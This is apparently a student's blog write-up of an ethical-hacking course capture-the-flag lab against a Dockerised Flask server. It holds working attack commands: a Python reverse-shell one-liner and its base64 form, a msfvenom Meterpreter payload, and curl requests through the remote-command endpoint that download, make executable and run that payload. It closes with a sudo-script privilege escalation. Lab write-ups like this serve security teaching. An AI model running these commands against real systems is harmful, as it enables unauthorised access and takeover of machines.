---
layout: ../../layouts/Post.astro
title: "LAB 3 EHP600"
description: "BASIC CTF on docker container with RCE as inital access vulnerabiliy"
date: "Spring 2026"
type: blog
tags: ["privilege escalation", "metasploit", "python", "docker", "Linux"]
backLink: /blog
backLabel: Back to posts
---


## Background
So lab3 in the ethical hacking course, this time its a capture the flag, inital access wise prob the easiest I have done in a while but it was fun, kinda missed red teaming abit.
Only thing is they make it to easy, lab 2 was alot more fun when we had to think, still writing on that one.

So the lab is in a docker environment and contains two "machines", one attacker and one server
The server is running as `ctf-target` and its running a flask server as web.

## Step 1
So the website allows for RCE, alittle bit of a let down tha it said it as soon as you went on to the site, could have atleast made us look for it.
<img src="/lab3/CTTARGETPAGE.png" alt="Res1" style="max-width: 500px; width: 100%;">

instead of manually being in the url bar I used curl just to speed it up, single commands where easy but when you start having special characters like spaces or `/` you needed to use URL encoding which is a pain in the ass to do manually
<img src="/lab3/whoami.png" alt="Res1" style="max-width: 500px; width: 100%;">

 **URL Encoding** is a way to represent special characters in a URL since URLs can only contain certain characters. Spaces, slashes, and symbols must be converted to a `%` followed by their hex code.
 Common ones: `%20` = space, `%2F` = `/`, `%26` = `&`, `%2B` = `+`
 So `ls /usr/local/bin/` becomes: `ls%20%2Fusr%2Flocal%2Fbin%2F`

<img src="/lab3/urlencode.png" alt="Res1" style="max-width: 500px; width: 100%;">

## Step 2 - shell
### Netcat
I knew I wanted more than just the RCE access, everything is possible through it but I had the time and its more fun that way. I did it two different ways, first is with netcat and one is with metasploit


Netcat wouldn't work when ran through the RCE on the server container so there are two alternatives either open an connection with bash or use python. I knew python was available since its running flask so I decided to use that. Both the attacker container and server are very limited with what packages are installed.

On the attacker machine I started a listner with netcat:
`nc -lvnp 9001`

 - `-l` — listen mode, wait for incoming connections instead of connecting outward
 - `-v` — verbose, print extra info like when a connection is made
 - `-n` — no DNS lookups, use raw IP addresses (faster)
 - `-p 9001` — the port to listen on (can be any unused port above 1024)


Also to make it easier to to run the command I base 64 encoded it so instead of the python:
```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("172.18.0.4",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
 - `import os,pty,socket` — imports libraries for OS interaction, terminal control, and networking
 - `s=socket.socket()` — creates a network socket (think of it as a phone you can call with)
 - `s.connect(("172.18.0.4",9001))` — connects back to our attacker machine IP on port 9001 (this is what makes it a *reverse* shell — the target calls us, not the other way around)
 - `os.dup2(s.fileno(),f)for f in(0,1,2)` — redirects stdin (0), stdout (1), and stderr (2) through the socket, so all input/output goes over the network connection
 - `pty.spawn("sh")` — spawns a shell through the connection

its base64 format:
```
cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTcyLjE4LjAuNCIsOTAwMSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigic2giKSc=
```
And then with the RCE you use base64 to decode it.
<img src="/lab3/revshell.png" alt="Res1" style="max-width: 500px; width: 100%;">

This opens a connection but being a pain in the ass to work with I used python to upgrade it to fully tty. Not necessary but it makes it so much easier to work with, being able to toggle through bash history and use commands like clear.
<img src="/lab3/ttyshell.png" alt="Res1" style="max-width: 500px; width: 100%;">


### Metasploit
An optional part of the lab was to use metasploit or just to get familear with it, using basic commands like `search` etc.
Having used metasploit before I decided that I wanted to use that also to get remote access. I creates an .ELF payload that I hosted on the attack machine and then using python downloaded to the CTF-Target machine using the RCE attack vector.

_Create payload_
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.18.0.4 LPORT=8899 -f elf -o /tmp/shell.elf
```

 - `msfvenom` — Metasploit's payload generator tool
 - `-p linux/x86/meterpreter/reverse_tcp` — the payload type: a Meterpreter reverse shell for 64-bit Linux
 - `LHOST=172.18.0.4` — our attacker machine's IP (the target will connect back to this)
 - `LPORT=8899` — the port our handler will listen on
 - `-f elf` — output format: ELF is the executable format used on Linux (like .exe on Windows)
 - `-o /tmp/shell.elf` — save the output to this file path

_Host it_
```
cd /tmp && python3 -m http.server 8080
```
_In metasploit_
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 172.18.0.4
set LPORT 8899
run
```

Then through the RCE there are three thing I need to do.
 - ***Download***
I first tried to use wget but didn't work - not installed so I had to use python again
```
curl "http://ctf-target:5000/run?cmd=python3+-c+'import+urllib.request%3Burllib.request.urlretrieve(\"http://172.18.0.4:8080/shell.elf\",\"/tmp/shell.elf\")'"
```
 - ***make it executable***
 To be able to run it you obviously need too make it an executable
 ```
 curl "http://ctf-target:5000/run?cmd=chmod+%2Bx+/tmp/shell.elf"
 ```
 - ***run payload***
 ```
curl "http://ctf-target:5000/run?cmd=/tmp/shell.elf"
 ```
 This then open a connection with metasploit.

 ## FLAGS
 For the flags I know there are two flags "open" and one that only root can access - classic CTF
 In metasploit you can easily search for files on the target system so all I did was search for `Flag*` and it printed the location of the flags

 _This Search was done after the flags were gathered, thats why flag3 is there aswell_
 <img src="/lab3/all_flags_meterpreter.png" alt="Res1" style="max-width: 500px; width: 100%;">

For the Flahs you have:
***FLAG1***
<img src="/lab3/flag1.png" alt="Res1" style="max-width: 500px; width: 100%;">

***FLAG2***
<img src="/lab3/flag2.png" alt="Res1" style="max-width: 500px; width: 100%;">

### Priv ESC flag3
For Privilege escalation I always run `sudo -l` to see if the user I have shell as have any sudo permissions and now it said we have sudo access to one file:
```
User student may run the following commands on 612345e333e0:
    (root) NOPASSWD: /usr/local/bin/[backup.sh](http://backup.sh)
```

So I checked out the file and when reading it:
```
#!/bin/bash
cp /root/flag3.txt /tmp/flag3.txt
chmod 644 /tmp/flag3.txt
echo "backup completed"
```
there are essentially two things it does
 - copies flag3.txt from /root
 - changes the permission to 644 (-rw-r--r--)

For our user to be able to see the content we need to create the file first as root can write to file we have access to but we cant access roots file wihtout excplicit permission to do so. So creating the file with a simple `touch /tmp/flag3.txt` and run the `/usr/local/bin/backup.sh` you can than get the file. Note that you must use ***sudo*** when you run it otherwise it won't be able to access the `/root/flag3.txt`, as in the image
<img src="/lab3/flag3.png" alt="Res1" style="max-width: 500px; width: 100%;">

### Further Priv esc
I really wanted to get a full root shell and I tried multiple things
 - Linpeas
 - Meterpreter `post/multi/recon/local_exploit_suggester`
 - SUID
 - Writable Files
 - cronjobs (none existed)
 But I could not find anything, I thing its because the container is only the absolute bare minimum which makes it a so much harder, so for now the FLAG3 priv esc will have to do. There was a helper.sh file but it wasn't linked to the backup.sh even though they echo the same maybe it should be linked somhow but isn't, guess we'll never know.